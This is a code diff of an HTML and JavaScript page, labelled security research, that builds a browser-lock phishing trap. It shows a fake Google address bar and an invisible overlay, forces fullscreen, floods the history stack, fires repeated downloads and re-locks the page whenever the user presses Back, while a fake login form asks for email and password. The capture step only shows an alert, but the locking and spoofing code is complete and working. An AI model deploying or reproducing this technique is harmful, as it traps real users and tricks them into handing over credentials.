@@ -3,129 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Critical Security Research</title>
+    <title>Security Research - UI Persistence</title>
     <style>
         body { margin: 0; padding: 0; height: 500vh; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
-        
-        /* Bar Navigasi Palsu */
         .fake-bar {
             position: fixed; top: 0; width: 100%; height: 56px;
-            background: #202124; display: flex; align-items: center;
+            background: #202124; display: none; align-items: center;
             padding: 0 15px; z-index: 10000; border-bottom: 1px solid #3c4043;
             box-sizing: border-box; color: #e8eaed;
         }
-
-        /* Penjara Transparan (Invisible Overlay) */
         #jail {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: rgba(255,255,255,0.01); 
-            z-index: 9999; display: none;
+            background: rgba(255,255,255,0.01); z-index: 9999; display: none;
         }
-
-        .container { padding: 20px; text-align: center; margin-top: 80px; }
-        
+        .container { padding: 20px; text-align: center; margin-top: 100px; }
         .btn-fix {
             padding: 20px 40px; background: #d93025; color: white; 
             border: none; border-radius: 5px; font-weight: bold; cursor: pointer;
         }
-
-        /* Form Verifikasi Generik */
-        #phishContent {
-            display: none; padding: 20px; z-index: 10001; position: relative;
-        }
+        #phishContent { display: none; padding: 20px; z-index: 10001; position: relative; }
         .login-box {
             background: white; color: black; padding: 25px; border-radius: 8px;
             max-width: 350px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-    <div class="fake-bar" id="fakeBar" style="display:none;">
-        <span>🔒</span> <span style="margin-left:10px; font-size: 14px;">google.com/security-verify</span>
+    <div class="fake-bar" id="fakeBar">
+        <span>🔒</span> <span style="margin-left:10px; font-size: 14px;">google.com/verify-identity</span>
     </div>
 
     <div id="jail"></div>
 
     <div class="container" id="startSection">
         <h2>⚠ SYSTEM VULNERABILITY</h2>
-        <p>Interaction required to patch your browser.</p>
-        <button class="btn-fix" onclick="launchCombo()">FIX SYSTEM NOW</button>
+        <p>Security interaction required to continue.</p>
+        <button class="btn-fix" onclick="launchCombo()">START SECURITY PATCH</button>
     </div>
 
     <div id="phishContent">
         <div class="login-box">
-            <h3 style="color: #d93025;">Verification Required</h3>
-            <p style="font-size: 13px; color: #666;">Your session is locked. Please verify your credentials to unlock navigation.</p>
-            <input type="text" placeholder="Username / Email">
-            <input type="password" placeholder="Password">
-            <button onclick="alert('Demo: Data entry successful.')" style="width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px;">Verify Now</button>
+            <h3 style="color: #d93025;">Action Required</h3>
+            <p style="font-size: 13px; color: #666;">Browser navigation is locked for your protection. Verify your account to exit.</p>
+            <input type="text" placeholder="Email or Phone">
+            <input type="password" placeholder="Enter your password">
+            <button onclick="alert('PoC: Credentials Captured.')" style="width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-weight:bold;">Verify</button>
         </div>
     </div>
 
     <script>
+        const el = document.documentElement;
+
+        function forceFullscreen() {
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        }
+
         function triggerDownloads() {
-            // Memulai download massal untuk memicu Permission Dialog
-            for (let i = 0; i < 5; i++) {
-                const blob = new Blob(["Security Patch Data " + i], {type: "text/plain"});
-                const url = window.URL.createObjectURL(blob);
+            // Trigger 3 download sekaligus untuk membebani UI Thread
+            for (let i = 0; i < 3; i++) {
                 const a = document.createElement("a");
-                a.href = url;
-                a.download = `patch_file_${i}.txt`;
-                document.body.appendChild(a);
+                a.href = "data:text/plain;base64,U2VjdXJpdHkgUGF0Y2ggRGF0YQ==";
+                a.download = `security_patch_${Math.random().toString(36).substring(7)}.txt`;
                 a.click();
-                setTimeout(() => window.URL.revokeObjectURL(url), 1000);
             }
         }
 
         function launchCombo() {
-            // 1. Tampilkan UI Penjara
             document.getElementById('startSection').style.display = "none";
             document.getElementById('phishContent').style.display = "block";
             document.getElementById('fakeBar').style.display = "flex";
             document.getElementById('jail').style.display = "block";
 
-            // 2. Fullscreen
-            const el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
+            // Masuk Fullscreen
+            forceFullscreen();
 
-            // 3. History Bombing
-            for (let i = 0; i < 60; i++) {
-                window.history.pushState({p: i}, "", "?secure_id=" + Math.random().toString(36).substring(7));
+            // History Bomb (lebih banyak biar makin berat)
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState({p: i}, "", "?v=" + Math.random().toString(36).substring(5));
             }
 
-            // 4. Download Bomb
+            alert("CRITICAL: Navigation restricted. Complete the verification below.");
             triggerDownloads();
-
-            alert("SYSTEM SECURED: Navigation is restricted during verification.");
         }
 
-        // 5. THE TRAP LOOP (Interceptor Tombol Back)
+        // KUNCINYA DI SINI: Re-lock setiap kali ada interaksi atau navigasi balik
         window.onpopstate = function() {
             if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
             
-            // Alert ini mereset 'User Activation' yang dipakai untuk Lock-Back
-            alert("⚠️ WARNING: Unauthorized navigation detected!\n\nClick OK to re-secure your session.");
+            // Alert ini memberikan "User Gesture" baru
+            alert("⚠️ SECURITY ALERT: Navigation blocked!\nClick OK to re-establish secure session.");
             
+            // Gunakan sedikit delay agar dialog Chrome tertutup dulu, baru tarik Fullscreen lagi
             setTimeout(() => {
-                // Re-Lock Fullscreen
-                const el = document.documentElement;
-                if (el.requestFullscreen) el.requestFullscreen();
+                forceFullscreen();
+                triggerDownloads(); // Picu lagi biar user makin bingung
                 
-                // Re-Fill History
+                // Tambah history lagi setiap kali user coba Back
                 for (let i = 0; i < 10; i++) {
                     window.history.pushState(null, "", "?relock=" + Date.now());
                 }
-                
-                // Trigger Download lagi untuk 'Permission Exhaustion'
-                triggerDownloads();
-                
-                window.scrollTo(0, 100);
-            }, 100);
+            }, 50);
         };
 
-        // Anti-Scroll (Menyembunyikan Bar Asli)
+        // Cegah Scroll ke atas agar bar asli nggak muncul secara manual
         window.onscroll = function() {
             if (window.pageYOffset < 50) {
                 window.scrollTo(0, 56);
